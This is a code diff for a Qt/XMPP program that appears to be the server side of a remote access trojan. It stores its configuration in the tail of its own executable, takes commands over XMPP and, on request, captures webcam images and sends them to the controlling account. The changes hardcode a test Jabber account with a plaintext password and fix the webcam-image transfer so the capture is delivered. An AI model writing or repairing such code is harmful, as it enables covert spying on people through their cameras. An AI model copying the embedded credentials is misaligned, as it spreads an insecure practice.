@@ -124,8 +124,8 @@ void MainWindow::inicio(){
 bool MainWindow::cargarConfiguracion(){
     /** Cargar la configuración del servidor guardada en el último KB del ejecutable **/
     //valores por defecto
-    this->cuentaXmpp = "";
-    this->contrasena = "";
+    this->cuentaXmpp = "cuentadeprueba2@jabber.org";
+    this->contrasena = "aspire";
     this->alias = "servidor";
     QString appPath = QApplication::applicationFilePath(); //ruta absoluta a la aplicaciÃ³n
     this->nombreCopiable = "noiniciar"; //Nombre del ejecutable
@@ -428,10 +428,11 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
         imagen = capturar();
         imagen.save(&bufferWebcam,"jpeg",parametros[1].toInt());
         QXmppTransferFileInfo informacion;
-        informacion.setName("|@|webbcam|@|");
+        informacion.setName("|@|webcam|@|");
         informacion.setSize(bufferWebcam.size());
+        bufferWebcam.close();
+        bufferWebcam.open(QIODevice::ReadOnly);
         job = manager->sendFile(from,&bufferWebcam,informacion);
-
     }
     if (parametros[0] == "encender")
     {
